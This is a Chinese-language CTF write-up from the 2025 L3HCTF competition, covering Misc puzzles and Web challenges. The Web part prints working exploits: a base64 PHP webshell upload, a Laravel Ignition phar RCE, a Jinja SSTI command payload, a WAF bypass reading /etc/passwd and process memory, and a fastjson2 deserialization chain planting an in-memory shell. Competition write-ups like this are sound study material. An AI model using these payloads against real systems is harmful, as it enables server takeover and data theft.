@@ -1,0 +1,3574 @@
+---
+title: 2025 L3HCTF SU WriteUp
+tags: ["L3HCTF"]
+date: 2025-07-13 20:21:10
+slug: "l3hctf-2025-su-wu"
+---
+
+感谢 L3H_Sec 的师傅们精心准备的比赛！本次L3HCTF我们 SU 取得了 第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+
+以下是我们 SU 本次 2025 L3HCTF的 WriteUp。
+
+<!--more-->
+
+![img](1.png)
+
+# Misc
+
+## LearnRag
+
+https://github.com/vec2text/vec2text
+
+https://arxiv.org/html/2401.12192v4
+
+```Python
+import vec2text
+import torch
+from transformers import AutoModel, AutoTokenizer, PreTrainedTokenizer, PreTrainedModel
+import pickle
+
+class RagData:
+    def __init__(self, embedding_model=None, embeddings=None):
+        self.embedding_model = embedding_model
+        self.embeddings = embeddings or []
+
+def get_gtr_embeddings(text_list,
+                       encoder: PreTrainedModel,
+                       tokenizer: PreTrainedTokenizer) -> torch.Tensor:
+
+    inputs = tokenizer(text_list,
+                       return_tensors="pt",
+                       max_length=128,
+                       truncation=True,
+                       padding="max_length",).to("cuda")
+
+    with torch.no_grad():
+        model_output = encoder(input_ids=inputs['input_ids'], attention_mask=inputs['attention_mask'])
+        hidden_state = model_output.last_hidden_state
+        embeddings = vec2text.models.model_utils.mean_pool(hidden_state, inputs['attention_mask'])
+
+    return embeddings
+
+
+encoder = AutoModel.from_pretrained("sentence-transformers/gtr-t5-base").encoder.to("cuda")
+tokenizer = AutoTokenizer.from_pretrained("sentence-transformers/gtr-t5-base")
+corrector = vec2text.load_pretrained_corrector("gtr-base")
+
+with open('rag_data.pkl', 'rb') as f:
+  rag_data = pickle.load(f)
+
+
+embeddings=rag_data.embeddings
+embeddings = torch.tensor(embeddings)
+# 查看数据结构
+print(embeddings.shape)
+
+vec2text.invert_embeddings(
+    embeddings=embeddings.cuda(),
+    corrector=corrector,
+    num_steps=20,
+)
+```
+
+flag出来的很乱，整理一下L3HCTF{wowthisisembedding}
+
+## 量子双生影
+
+ntfs数据流隐写+ai二维码变换+双图合并
+
+首先给出的二维码很明显可以用https://github.com/Tokeii0/LoveLy-QRCode-Scanner 这个项目进行扫描
+
+给出的提示是
+
+![img](78cfb26b-4720-4e2a-85ae-2f2468d2394d.png)
+
+分析解压出的图片很明显和压缩包大小不符合，检索考察的是ntfs数据流隐写，
+
+![img](11994d42-4157-47a8-af08-0e0f8783a497.png)
+
+解压用ntfsstreamseditor这个工具提取一下得到另外一个图片，分析发现是两个图片进行了xor用现成工具或写脚本
+
+```Python
+from PIL import Image
+
+def xor_images(img1_path, img2_path, output_path="xor_result.png"):
+    # 加载并转换为RGB格式
+    img1 = Image.open(img1_path).convert("RGB")
+    img2 = Image.open(img2_path).convert("RGB")
+
+    if img1.size != img2.size:
+        raise ValueError("图片尺寸不一致，无法进行异或运算")
+
+    w, h = img1.size
+    result = Image.new("RGB", (w, h))
+
+    # 每像素逐位异或
+    for x in range(w):
+        for y in range(h):
+            r1, g1, b1 = img1.getpixel((x, y))
+            r2, g2, b2 = img2.getpixel((x, y))
+            result.putpixel((x, y), (
+                r1 ^ r2,
+                g1 ^ g2,
+                b1 ^ b2
+            ))
+
+    result.save(output_path)
+    print(f"[+] 已保存异或图像为: {output_path}")
+
+# 示例用法
+if __name__ == "__main__":
+    xor_images("1.webp", "2.webp", "xor_result.png")
+```
+
+得到图片还是用项目解码
+
+![img](dbaa88a4-49fe-46ba-b209-f25d43fd9476.png)
+
+## Please Sign In
+
+真签到题 ai梭哈点击就送哦内盖
+
+丢给gpt让gpt生成脚本即可
+
+```Python
+import torch
+from torchvision import transforms
+from torchvision.models import shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights
+from PIL import Image
+import json
+import requests
+import os
+
+def invert_embedding_to_image(embedding_path, output_path, steps=500, lr=0.1):
+    # Load model
+    model = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)
+    model.fc = torch.nn.Identity()
+    model.eval()
+
+    # Load target embedding
+    with open(embedding_path, 'r') as f:
+        target_emb = torch.tensor(json.load(f), dtype=torch.float32)
+
+    # Initialize trainable image tensor (noise)
+    img = torch.randn(1, 3, 224, 224, requires_grad=True)
+    optimizer = torch.optim.Adam([img], lr=lr)
+
+    for step in range(steps):
+        optimizer.zero_grad()
+        # Sigmoid to bound pixels between 0 and 1
+        clipped = img.sigmoid()
+        emb = model(clipped)[0]
+        loss = torch.nn.functional.mse_loss(emb, target_emb)
+        loss.backward()
+        optimizer.step()
+        if step % 50 == 0:
+            print(f'Step {step}, Loss {loss.item():.6e}')
+
+    # Convert to image and save
+    result = (clipped.detach().squeeze().permute(1, 2, 0).cpu().numpy() * 255).astype('uint8')
+    inv_image = Image.fromarray(result)
+    inv_image.save(output_path)
+    print(f"Inverted image saved to '{output_path}'")
+
+def upload_and_print_response(image_path, server_url):
+    if not os.path.exists(image_path):
+        print(f"File '{image_path}' not found.")
+        return
+    with open(image_path, 'rb') as f:
+        files = {'file': f}
+        response = requests.post(server_url, files=files)
+    try:
+        print("Server response:", response.json())
+    except ValueError:
+        print("Server response (text):", response.text)
+
+if __name__ == "__main__":
+    EMB_PATH = 'embedding.json'
+    OUT_IMG = 'inverted_image.png'
+    SIGNIN_URL = 'http://1.95.8.146:50001/signin/'
+
+    # Step 1: Invert embedding to image
+    invert_embedding_to_image(EMB_PATH, OUT_IMG, steps=500, lr=0.1)
+
+    # Step 2: Upload image and print the flag or failure
+    upload_and_print_response(OUT_IMG, SIGNIN_URL)
+```
+
+![img](1daa888b-d0cc-4a51-bef2-d6d262291ac5.png)
+
+## PaperBack
+
+给出了一条纸带上面全是点阵，看题目描述感觉像是拿纸带来保存数据，而且题目中提到了OllyDbg，通过关键词纸带和ollydbg可以搜到一个叫Paperback的东西：https://ollydbg.de/Paperbak/ ，下载这个软件扫描这条纸带可以扫描出一个很大的，但是内容空白的文件，放进Cyberchef转为hex可以看到：
+
+![img](321aeec8-1d5b-442a-acf6-bc4b3aa0e76c.png)
+
+只有20、09、0d、0a四种字符，而0d0a实际上就是`\r\n`，可以忽略，在这里将`0d 0a `换成换行可以得到：
+
+![img](935d47d1-f07f-4cf2-b9c3-d8c8025d9b4f.png)
+
+发现有很多单独出现的09，应该可以忽略，其余的每一行都只有20和09，而且除了第一行和那些单独出现的09之外全是十二个一组，猜测是二进制，且20对应0，09对应1，处理一下可以得到：
+
+```Plain
+01001100  
+00110011  
+01001000  
+01000011  
+01010100  
+01000110  
+01111011  
+01110111  
+01100101  
+01101100  
+01100011  
+01101111  
+01101101  
+01100101  
+01011111  
+01110100  
+01101111  
+01011111  
+01101100  
+00110011  
+01101000  
+01100011  
+01110100  
+01100110  
+00110010  
+00110000  
+00110010  
+00110101  
+01111101
+```
+
+用Cyberchef转换一下就可以得到flag：
+
+![img](062d6937-e725-4a9c-9c29-a35978a11797.png)
+
+## Why not read it out?
+
+魔改trunic，手搓音标表
+
+首先现在附件得到一个README文件，用010看看发现是jpg，而且末尾藏了一个翻转的base64编码，处理一下得到提示IGN Review，同时修改文件后缀打开图片得到以下内容
+
+![img](4366a723-310c-48c4-8277-4e6795d49a10.jpg)
+
+简单社工一下，确定这些文字来自于tunic这个游戏，这是一种由游戏作者自创的音标文字，将单词的音标划分为元音和辅音后，通过外圆内辅的构造方式拼凑出英文单词
+
+![img](305f380b-1cef-4381-a515-c87183afa9ca.png)
+
+然而正常去破译密文会发现不对劲，很多音标根本对不上，显然是出题人把文字给魔改了
+
+此时再次分析提示，可以知道要去看ign的评论，在ign官网找到这个游戏后可以发现对应的官方测评只有下面这一个
+
+https://www.ign.com/articles/tunic-review-xbox-pc-steam
+
+通过对比发现，评测的第一段内容与密文的前面一大段都是完全对应的，因此我们得到了魔改tunic文字的密文以及对应明文
+
+![img](c234ae48-7282-4de3-b6d4-62eac05daa20.png)
+
+随后我们要做的就是手搓映射表，然后解出下面的五条文字即可得到flag
+
+![img](18785a00-1b8d-4bee-b00e-6482c66d9702.png)
+
+最终破译出来的内容大致如下，简单处理一下即可得到正确的flag
+
+```Python
+the content of flag is: come on little brave fox
+replace lesser o with number zero, letter l with number one
+replace lesser a with symbol at
+make every lesser e uppercase
+use underline to link each word
+```
+
+# Web
+
+## 赛博侦探
+
+抓包得到路由
+
+![img](2e309494-31a1-4e2c-ad39-baa4c1c43b5f.png)
+
+回答四个问题
+
+邮箱根据下载的docx
+
+![img](41aecc71-b7f7-4182-9795-cacd56335a56.png)
+
+店铺根据羽毛球店的距离可以得到大致的地点
+
+![img](6e0f3c45-7240-4149-b3a8-30ea3e563a7b.png)
+
+取 114.175958,30.623494
+
+老家一开始猜测就是武汉，实际需要通过机票码扫描
+
+![img](50758324-d972-4025-a866-3e94ef0718a1.png)
+
+知道了老家是福州以及英文名LELAND
+
+跳转到路由/secret/my_lovely_photos，分析图片都是?name=，猜测文件读取
+
+![img](d2feac3a-b04a-4cbb-9a31-0567507cfbc7.png)
+
+下载文件得到flag
+
+## gogogo出发喽
+
+![img](228a2243-d2e9-4304-9c4d-468c5e905c71.png)
+
+可以爆破出是`admin888`，本地也能getshell，但是不能进远程的后台，419错误。发现是开启了debug模式的，访问`/_ignition/health-check`得到的{"can_execute_commands":true}这个回显，查看MakeViewVariableOptionalSolution.php
+
+![img](af08c65a-59dc-4dd2-9dd5-34334b129146.png)
+
+利用phpggc生成恶意payload
+
+```Bash
+php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "phpinfo();" --phar phar -o /tmp/phar.gif
+
+cat /tmp/phar.gif | base64 -w 0
+```
+
+尝试直接利用CVE发现不能成功，审计代码找到一个上传文件的接口
+
+```HTTP
+POST /api/image/base64 HTTP/1.1
+Host: 1.95.8.146:41164
+Content-Length: 169
+Accept: application/json
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+Origin: http://1.95.8.146:41164
+Referer: http://1.95.8.146:41164/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+ 
+{"data": "data:image/jpeg;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+"}
+```
+
+![img](20a51efc-3408-4c46-9a70-ee322c047832.png)
+
+成功上传，尝试写入phar文件
+
+```HTTP
+POST /_ignition/execute-solution HTTP/1.1
+Host: 1.95.8.146:41164
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{
+"viewFile":"phar:///var/www/html/public/uploads/images/_uc40mzhOJ6cNEKoF.jpeg/test.txt",
+"variableName":"test"
+}}
+```
+
+![img](f6b72b2a-24d7-410d-8366-6e77e42b067d.png)
+
+测试发现fast_destruct就可以绕过了，修复签名的脚本
+
+```Python
+from hashlib import sha1
+with open('phar.gif', 'rb') as file:
+    f = file.read() 
+   
+s = f[:-28] # 获取要签名的数据
+h = f[-8:] # 获取签名类型和GBMB标识
+newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)
+
+with open('phar1.gif', 'wb') as file:
+    file.write(newf) # 写入新文件
+```
+
+有了shell之后，发现权限不够，suid提权即可
+
+```Python
+openssl enc -in "/flag_gogogo_chufalong"
+```
+
+## **best_profile**
+
+此路由二次渲染last_ip,如果last_ip可控会造成模板注入
+
+```Python
+@app.route("/ip_detail/<string:username>", methods=["GET"])
+def route_ip_detail(username):
+    res = requests.get(f"http://127.0.0.1/get_last_ip/{username}")
+    if res.status_code != 200:
+        return "Get last ip failed."
+    last_ip = res.text
+    try:
+        ip = re.findall(r"\d+\.\d+\.\d+\.\d+", last_ip)
+        country = geoip2_reader.country(ip)
+    except (ValueError, TypeError):
+        country = "Unknown"
+    template = f"""
+    <h1>IP Detail</h1>
+    <div>{last_ip}</div>
+    <p>Country:{country}</p>
+    """
+    return render_template_string(template)
+```
+
+应用使用了ProxyFix中间件
+
+```Plain
+from werkzeug.middleware.proxy_fix import ProxyFix
+app.wsgi_app = ProxyFix(app.wsgi_app)
+```
+
+ProxyFix中间件的作用是从代理服务器传递的请求头中获取客户端的真实IP地址。当请求经过代理（如Nginx）时，原始客户端的IP会被保存在X-Forwarded-For头中。通过设置ProxyFix中间件，Flask的request.remote_addr将不再使用直接连接的客户端IP（通常是代理服务器的IP），而是使用X-Forwarded-For请求头中的IP地址。
+
+```SQL
+X-Forwarded-For: 127.0.0.1 {%set ca=e|slice(16)|string|batch(16)|first|last+e|slice(7)|string|batch(7)|first|last+e|slice(8)|string|batch(8)|first|last+e|slice(11)|string|batch(11)|first|last+cycler.__doc__[697]+e|pprint|lower|batch(5)|first|last+e|slice(28)|string|batch(28)|first|last+e|slice(7)|string|batch(7)|first|last+e|slice(2)|string|batch(2)|first|last%}{{(sbwaf.__eq__.__globals__.sys.modules.os.popen(ca)).read()}}
+```
+
+配置文件中有如下内容
+
+```Plain
+location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
+    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;
+    proxy_pass http://127.0.0.1:5000;
+    proxy_cache static;
+    proxy_cache_valid 200 302 30d;
+}
+
+location ~ .*\.(js|css)?$ {
+    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;
+    proxy_pass http://127.0.0.1:5000;
+    proxy_cache static;
+    proxy_cache_valid 200 302 12h;
+}
+```
+
+服务器设置了缓存所有以.js结尾的响应,同时注册功能没有限制用户名中的特殊字符,这使得我们可以构造特殊的用户名,例如:username.js。当我们注册完成后先向`/`发送带有`X-Forwarded-For:xxx`的请求，再向`/get_last_ip/username.js`发送请求,服务器返回的响应会被缓存,无论接下来的请求是否携带cookie,只要路径相同,返回的结果都会是相同的。`/ip_detail`路由内部向`/get_last_ip`发送的请求即使不携带cookie也会返回我们给予的last_ip。
+
+## gateway_advance
+
+对于此处的过滤
+
+```Java
+access_by_lua_block {
+    local blacklist = {"%.", "/", ";", "flag", "proc"}
+    local args = ngx.req.get_uri_args()
+    for k, v in pairs(args) do
+        for _, b in ipairs(blacklist) do
+            if string.find(v, b) then
+                ngx.exit(403)
+                    end
+            end
+    end
+}
+```
+
+https://github.com/p0pr0ck5/lua-resty-waf/issues/280
+
+```Plain
+/download?&a0=0&a1=1&a2=2&a3=3&a4=4&a5=5&a6=6&a7=7&a8=8&a9=9&a10=10&a11=11&a12=12&a13=13&a14=14&a15=15&a16=16&a17=17&a18=18&a19=19&a20=20&a21=21&a22=22&a23=23&a24=24&a25=25&a26=26&a27=27&a28=28&a29=29&a30=30&a31=31&a32=32&a33=33&a34=34&a35=35&a36=36&a37=37&a38=38&a39=39&a40=40&a41=41&a42=42&a43=43&a44=44&a45=45&a46=46&a47=47&a48=48&a49=49&a50=50&a51=51&a52=52&a53=53&a54=54&a55=55&a56=56&a57=57&a58=58&a59=59&a60=60&a61=61&a62=62&a63=63&a64=64&a65=65&a66=66&a67=67&a68=68&a69=69&a70=70&a71=71&a72=72&a73=73&a74=74&a75=75&a76=76&a77=77&a78=78&a79=79&a80=80&a81=81&a82=82&a83=83&a84=84&a85=85&a86=86&a87=87&a88=88&a89=89&a90=90&a91=91&a92=92&a93=93&a94=94&a95=95&a96=96&a97=97&a98=98&a=information_schemas&filename=../etc/passwd
+```
+
+对于此处的过滤
+
+```Go
+proxy_pass http://127.0.0.1/static$arg_filename;
+body_filter_by_lua_block {
+    local blacklist = {"flag", "l3hsec", "l3hctf", "password", "secret", "confidential"}
+    for _, b in ipairs(blacklist) do
+        if string.find(ngx.arg[1], b) then
+            ngx.arg[1] = string.rep("*", string.len(ngx.arg[1]))
+            end
+        end
+    }
+}
+```
+
+Range 头是 HTTP 协议中用于请求部分内容的请求头，格式为：
+
+> Range: bytes=[start]-[end]
+>
+> 允许客户端指定需要获取的资源字节范围，实现断点续传和分块下载功能。
+
+![img](64b86e56-6d44-4532-8aa1-f2f91eeae5c5.png)
+
+首先利用此方法遍历文件描述符在 /proc/1/fd/6 找到 password 为`passwordismemeispasswordsoneverwannagiveyouup`
+
+然后可以先通过`/proc/self/maps`获得当前进程虚拟地址映射
+
+![img](c12f8782-5fe4-424c-b894-162e22a108cb.png)
+
+在本地环境 nginx.conf 的初始化代码后面加上一段，获取 flag 变量的地址
+
+```Lua
+init_by_lua_block {
+        # 在最后加上一段
+        print(tostring(flag))
+        local ffi = require("ffi")
+        local ptr = ffi.cast("const char*", flag)
+        print("Address: ", tostring(ptr))
+}
+```
+
+找到 flag 存储在 /dev/zero 的下一段内存中
+
+读取 /proc/self/mem 中对应的内存，搜索 'L3H' 即可获得 flag
+
+```Plain
+GET /read_anywhere HTTP/1.1
+Host: Your_host
+X-Gateway-Password: test_password
+X-Gateway-Filename: /proc/self/mem
+X-Gateway-Start: 0x7e07636f3000
+X-Gateway-Length: 0x100000
+```
+
+## Tellmewhy
+
+一道java题，solon框架，存在fastjson2依赖
+
+![img](58ce9bd7-c3a4-402c-9cf4-f51a6c49a316.png)
+
+/baby/way 路由存在反序列化点
+
+![img](f51300e2-7447-483a-a66e-0b2dbdeb182a.png)
+
+自定义objectStream中定义了反序列化黑名单
+
+- javax.management.BadAttributeValueExpException
+- javax.swing.event.EventListenerList
+- javax.swing.UIDefaults$TextAndMnemonicHashMap
+
+目的应该是想过滤hashmap -> fastjson2.JSONArray中的链子，不管是通过经验还是跑一下tabby都能发现还有XString这个可用的链子
+
+![img](80313d59-c466-4877-9542-8f492b4c9f7b.png)
+
+基于这个构造出基础payload
+
+```Java
+import com.alibaba.fastjson2.JSONObject;
+
+import java.io.*;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+import com.sun.org.apache.xpath.internal.objects.XString;
+
+
+public class Test2 {
+    public static void main(String[] args) throws Exception {
+
+        TestObj testObj = new TestObj();
+        JSONObject jsonObject1 = new JSONObject();
+        jsonObject1.put("g", testObj);
+        
+        XString xs = new XString("\n");
+
+        HashMap hashMap = new HashMap<>();
+        HashMap hashMap2 = new HashMap<>();
+        hashMap.put("yy",jsonObject1);
+        hashMap.put("zZ", xs);
+        hashMap2.put("yy",xs);
+        hashMap2.put("zZ",jsonObject1);
+
+        Object obj = makeMap(hashMap, hashMap2);
+        serialize(obj);
+        unserialize("ser.bin");
+    }
+
+
+    public static void setFieldValue(Object obj, String field, Object value) throws Exception {
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(true);
+        f.set(obj, value);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+        oos.close();
+
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+    public static HashMap makeMap(Object v1, Object v2) throws Exception {
+        HashMap s = new HashMap();
+        setFieldValue(s, "size", 2);
+        Class nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        } catch (ClassNotFoundException e) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+        setFieldValue(s, "table", tbl);
+        return s;
+    }
+}
+```
+
+fastjson2 与 fastjson1 机制上不太一样，通过fastjson2 构造反序列化链触发templates会进入黑名单，常见的打法是需要通过代理类进行处理，这部分详细内容可通过下述链接学习：
+
+- https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q
+- https://github.com/Ape1ron/FastjsonInDeserializationDemo1#
+
+出题人在赛题中也贴心的直接给出了可以使用的代理类org.example.demo.Utils.MyProxy
+
+![img](5f8b27e1-24a3-4b12-a436-64107531231c.png)
+
+在有这个类的基础上就可以编写出完整的poc
+
+```Java
+import com.sun.org.apache.xpath.internal.objects.XString;
+import common.Reflections;
+import common.Util;
+import gadgets.*;
+import org.example.demo.Utils.MyObject;
+
+import javax.naming.spi.ObjectFactory;
+import javax.xml.transform.Templates;
+import java.lang.reflect.*;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Fastjson4_ObjectFactoryDelegatingInvocationHandler {
+
+    public Object getObject(String cmd) throws Exception {
+
+//        System.setProperty("properXalan", "true");
+
+        Object node1 = TemplatesImplNode.makeGadget(cmd);
+        Map map = new HashMap();
+        map.put("object", node1);
+        Object node2 = JSONObjectNode.makeGadget(2, map);
+        Proxy proxy1 = (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),
+                new Class[]{ObjectFactory.class, MyObject.class}, (InvocationHandler) node2);
+
+        Object node3 = makeGadget(proxy1);
+        Proxy proxy2 = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),
+                new Class[]{Templates.class}, (InvocationHandler) node3);
+        Object node4 = JsonArrayNode.makeGadget(2, proxy2);
+//       Object node5 = BadAttrValExeNode.makeGadget(node4);
+
+        Map gadgetChain = makeXStringToStringTrigger(node4);
+
+        Object[] array = new Object[]{node1, gadgetChain};
+        Object node6 = HashMapNode.makeGadget(array);
+        return node6;
+    }
+
+    public static Map makeXStringToStringTrigger(Object o) throws Exception {
+        XString x = new XString("\n");
+
+        return makeMap(o, x);
+    }
+
+    public static Map makeMap(Object v1, Object v2) throws Exception {
+        Map map1 = new HashMap();
+        map1.put("yy", v1);
+        map1.put("zZ", v2);
+
+        Map map2 = new HashMap();
+        map2.put("yy", v2);
+        map2.put("zZ", v1);
+
+
+        HashMap s = new HashMap();
+        setFieldValue(s, "size", 2);
+        Class nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        } catch (ClassNotFoundException e) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));
+        Reflections.setFieldValue(s, "table", tbl);
+        return s;
+    }
+
+    private static void setFieldValue(Object obj, String field, Object value) throws Exception {
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(true);
+        f.set(obj, value);
+    }
+
+
+    public static void main(String[] args) throws Exception {
+        Object object = new Fastjson4_ObjectFactoryDelegatingInvocationHandler().getObject(Util.getDefaultTestCmd());
+        byte[] serialize = Util.serialize(object);
+        String s = Base64.getEncoder().encodeToString(serialize);
+        System.out.println(s);
+        System.out.println(s.length());
+//        Util.runGadgets(object);
+    }
+
+    public static Object makeGadget(Object gadget) throws Exception {
+        return Reflections.newInstance("org.example.demo.Utils.MyProxy",
+                MyObject.class, gadget);
+    }
+
+
+}
+```
+
+在进入到正式的反序列化逻辑之前还有一个问题，改路由对传递进的json数量进行了比对，solon框架解析到的map和fastjson2解析到的length需要不一致
+
+![img](95170242-6afe-45d8-b014-f86259b1d996.png)
+
+这一点就涉及到了解析特性相关内容，fastjson2和fastjson1一致，仍旧支持@type键，在正常的solon解析是无法被解析到，从而绕过了这一点
+
+```Plain
+{"@type": "java.util.HashMap","why":"base64 payload"}
+```
+
+最后成功触发反序列化，但远程环境不出网，还需要去找一个solon内存马
+
+https://github.com/wuwumonster/note/blob/3463f12984aa347292d508e4fb1d4d9a7f2b0bc5/JavaSec/JavaSec/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%20%E5%86%85%E5%AD%98%E9%A9%AC.md?plain=1#L84
+
+随便找了一个solon filter内存马即可
+
+![img](1e48b496-9f7e-4a88-922c-755b8c8d24d3.png)
+
+最后将内存马放入到templates中即可
+
+```Java
+package gadgets;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import common.ClassFiles;
+import common.Reflections;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.LoaderClassPath;
+
+import java.io.ByteArrayOutputStream;
+import java.io.Serializable;
+import java.util.zip.GZIPOutputStream;
+import java.util.Base64;
+
+public class TemplatesImplNode {
+    public static Object makeGadget(String cmd) throws Exception {
+        return createTemplatesImpl(cmd);
+    }
+
+    public static Object createTemplatesImpl(final String command) throws Exception {
+        Class tplClass;
+        Class abstTranslet;
+        Class transFactory;
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
+            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
+            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
+        } else {
+            tplClass = TemplatesImpl.class;
+            abstTranslet = AbstractTranslet.class;
+            transFactory = TransformerFactoryImpl.class;
+        }
+
+        Class<?> clazz = Class.forName("memo.FilterMemshell", false, Thread.currentThread().getContextClassLoader());
+        return createTemplatesImpl(clazz, (String) null, (byte[]) null, tplClass, abstTranslet, transFactory);
+
+//        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+
+
+    public static <T> T createTemplatesImpl(Class myClass, String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
+        T templates = (T) tplClass.newInstance();
+        byte[] classBytes = new byte[0];
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
+        CtClass superC = pool.get(abstTranslet.getName());
+
+        if (myClass != null) {
+            CtClass ctClass = pool.get(myClass.getName());
+            ctClass.setSuperclass(superC);
+            ctClass.setName(myClass.getName() + System.nanoTime());
+            classBytes = ctClass.toBytecode();
+        }
+
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});
+        Reflections.setFieldValue(templates, "_name", "ysoserial.Pwner" + System.nanoTime());
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+
+
+    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
+            throws Exception {
+        final T templates = tplClass.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        // run command in static initializer
+        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replace("\\", "\\\\").replace("\"", "\\\"") +
+                "\");";
+        clazz.makeClassInitializer().insertAfter(cmd);
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
+                classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+
+    public static class Foo implements Serializable {
+
+        private static final long serialVersionUID = 8207363842866235160L;
+    }
+
+    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+
+        private static final long serialVersionUID = -5971610431559700674L;
+
+
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
+
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
+    }
+}
+```
+
+到最后仍旧有个小坑点，这台机器远程没有/bin/bash，捣鼓半天换成/bin/sh就拿到flag了
+
+![img](628e4417-4507-45a2-ba52-5ecf38f1a415.png)
+
+Get flag
+
+![img](db43b021-3df5-48ca-ab97-3edb5efa1554.png)
+
+## LookingMyEyes
+
+考察.NET反序列化，看一下链子的构成
+
+出题人写了一条非常简单的链子。
+
+![img](b12e1317-4812-4bdc-a518-fe2dbb461620.png)
+
+这里直接利用委托方法调用写文件的函数。覆盖/app/Looking/My/Eyes.cshtml
+
+```Java
+using ClassLibrary1;
+using ClassLibrary1.Beans;
+using ClassLibrary1.Transform;
+using ClassLibrary1.Utils;
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.Serialization.Formatters.Binary;
+
+public class AdvancedTestPayloadGenerator
+{
+    static void Main(string[] args)
+    {
+        string base64 = Generate();
+        Console.WriteLine("=== Generated BinaryFormatter Payload (Base64) ===");
+        Console.WriteLine(base64);
